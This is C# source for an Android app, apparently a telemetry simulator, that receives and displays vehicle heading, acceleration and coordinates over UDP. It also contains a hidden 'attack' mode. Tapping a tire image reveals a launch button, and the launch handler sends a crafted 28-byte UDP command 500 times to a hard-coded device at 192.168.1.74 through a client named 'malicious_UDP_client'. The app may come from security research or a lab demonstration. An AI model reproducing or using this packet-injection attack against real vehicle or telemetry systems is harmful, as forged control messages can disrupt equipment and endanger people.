using System;
using System.Text;
using System.Threading;
using System.Net;
using System.Net.Sockets;
using Android.App;
using Android.Content;
using Android.OS;
using Android.Runtime;
using Android.Views;
using Android.Widget;
using Android.Graphics;

namespace TelemetrySim
{
    [Activity(Theme = "@style/Theme.NoTitle")]
    public class TelemetryActivity : Activity
    {
        TextView textView_heading;
        TextView textView_coordinate_x;
        TextView textView_coordinate_y;
        TextView textView_acceleration;

        UdpState state;
        bool stop;
        bool busy_processing;
        bool receive_paused;
        private const int LISTENING_PORT = 8353;
        private const int INCOMING_ELEMENT_LENGTH = 4;
        float heading = 0;
        float acceleration = 0;
        float track = 0;
        float coordinate_x = 0;
        float coordinate_y = 0; 

        protected override void OnCreate(Bundle savedInstanceState)
        {
            RequestWindowFeature(WindowFeatures.NoTitle);
            base.OnCreate(savedInstanceState);
            SetContentView(Resource.Layout.Telemetry_UI);

            IPEndPoint end_point = new IPEndPoint(IPAddress.Any, LISTENING_PORT);
            UdpClient udp_listener = new UdpClient(end_point);

            state = new UdpState();
            state.end_point = end_point;
            state.udp_listener = udp_listener;

            ThreadPool.QueueUserWorkItem(o => StartUDPlistener());
            textView_heading = FindViewById<TextView>(Resource.Id.HeadingData);
            textView_coordinate_x = FindViewById<TextView>(Resource.Id.CoordinateX_text);
            textView_coordinate_y = FindViewById<TextView>(Resource.Id.CoordinateY_text);
            textView_acceleration = FindViewById<TextView>(Resource.Id.AccelerationData);

            ImageButton attackButton1 = FindViewById<ImageButton>(Resource.Id.TireImageFL);

            attackButton1.Click += (object sender, EventArgs e) =>
            {
                PrepAttack();
            };
        }

        private void UpdateUI()
        {
            textView_heading.Text = heading.ToString();
            textView_coordinate_x.Text = coordinate_x.ToString();
            textView_coordinate_y.Text = coordinate_y.ToString();
            textView_acceleration.Text = acceleration.ToString();
        }

        private void PrepAttack()
        {
            View telemetry_activity = FindViewById(Resource.Id.activity_telemetry);
            ImageButton tire_image_FL = FindViewById<ImageButton>(Resource.Id.TireImageFL);
            ImageView tire_image_FR = FindViewById<ImageView>(Resource.Id.TireImageFR);
            ImageView tire_image_RL = FindViewById<ImageView>(Resource.Id.TireImageRL);
            ImageView tire_image_RR = FindViewById<ImageView>(Resource.Id.TireImageRR);
            ImageButton attack_launch = FindViewById<ImageButton>(Resource.Id.LaunchButton);

            telemetry_activity.SetBackgroundColor(Color.Red);
            tire_image_FL.SetBackgroundColor(Color.Red);
            tire_image_FR.SetBackgroundColor(Color.Red);
            tire_image_RL.SetBackgroundColor(Color.Red);
            tire_image_RR.SetBackgroundColor(Color.Red);

            attack_launch.SetBackgroundColor(Color.Red);
            attack_launch.Clickable = true;
            attack_launch.Visibility = ViewStates.Visible;
            attack_launch.Click += (object sender, EventArgs e) =>
            {
                LaunchAttack();
            };


        }

        private void LaunchAttack()
        {
            byte[] message =   {  0x00, 0x00, 0x00, 0x06,
                            0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x01,
                            0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00 };

            UdpClient malicious_UDP_client = new UdpClient("192.168.1.74", 4282);

            int count = 0;
            while (count < 500)
            {
                malicious_UDP_client.Send(message, message.Length);
                count++;
            }
        }

        private void StartUDPlistener()
        {
            state.udp_listener = new UdpClient(state.end_point);
            Receive();
            RunOnUiThread(() => textView_heading.Text = "Listener launched");
        }

        private void StopUDPlistener()
        {
            stop = true;
        }

        private void Receive()
        {
            state.udp_listener.BeginReceive(new AsyncCallback(ProcessTelemetryData), null);
        }

        private void ProcessTelemetryData(IAsyncResult result)
        {
            state.end_point = new IPEndPoint(IPAddress.Any, LISTENING_PORT);
            byte[] data = state.udp_listener.EndReceive(result, ref state.end_point);
            if (!stop && !busy_processing)
            {
                Receive();
            }
            else
            {
                receive_paused = true;
            }
            ProcessData(data);
        }

        private void ProcessData(byte[] data)
        {
            busy_processing = true;
            byte[] current_data = (byte[])data.Clone();
            int element_cnt = data.Length / INCOMING_ELEMENT_LENGTH;
            byte[][] elements = new byte[element_cnt][];

            if (element_cnt == 7)
            {
                for (int i = 0; i < element_cnt; i++)
                {
                    elements[i] = new byte[INCOMING_ELEMENT_LENGTH];
                    Array.Copy(current_data, (i * INCOMING_ELEMENT_LENGTH), elements[i], 0, INCOMING_ELEMENT_LENGTH);
                }

                if (BitConverter.ToUInt32(elements[3], 0) == 2)
                {
                    byte[] byte_swap = new byte[2];
                    byte_swap[0] = elements[5][0];
                    byte_swap[1] = elements[5][1];
                    heading = (float)BitConverter.ToInt16(byte_swap, 0);
                    heading = heading / 100;

                    acceleration = (float)(elements[5][3]);
                    acceleration = acceleration - 100; 
                }

                if (BitConverter.ToUInt32(elements[3], 0) == 1)
                {
                    coordinate_x = (float)BitConverter.ToInt16(elements[6], 0);
                    coordinate_x = coordinate_x - 20000;
                    coordinate_x = coordinate_x / 20;

                    coordinate_y = (float)BitConverter.ToInt16(elements[6], 2);
                    coordinate_y = coordinate_y - 20000;
                    coordinate_y = coordinate_y / 20;
                }

            }
            else
            {
                heading = 0;
                acceleration = 0;
                track = 0;
                coordinate_x = 0;
                coordinate_y = 0;
            }

            RunOnUiThread(() => UpdateUI());

            busy_processing = false;
            if (receive_paused)
            {
                receive_paused = false;
                Receive();
            }
        }
    }

    public class UdpState
    {
        public IPEndPoint end_point;
        public UdpClient udp_listener;
    }
}

